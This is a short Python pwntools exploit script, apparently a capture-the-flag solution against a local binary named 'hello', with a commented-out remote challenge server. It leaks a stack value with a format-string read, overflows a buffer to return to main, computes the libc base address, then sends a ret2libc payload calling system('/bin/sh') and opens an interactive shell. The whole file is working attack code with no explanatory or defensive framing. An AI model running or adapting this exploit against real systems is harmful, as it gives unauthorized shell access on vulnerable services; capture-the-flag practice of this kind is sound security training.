from pwn import *

#p = remote('chall.csivit.com', 30046)
elf = ELF('./hello', checksec = False)
libc = ELF('libc.so.6', checksec = False)
p = process('./hello')
payload = '%42$x'+'A'*(0x88-5)+p32(elf.sym['main'])
print p.recv()
p.sendline(payload)
a = p.recv()
print a
libc.address = int(a[7:15],16)-245-libc.sym['__libc_start_main']+0x4640
payload2 = 'A'*0x88+p32(libc.sym['system'])*2+p32(libc.search('/bin/sh').next())
pause()
p.sendline(payload2)
print p.recv()
p.interactive()
#print payload
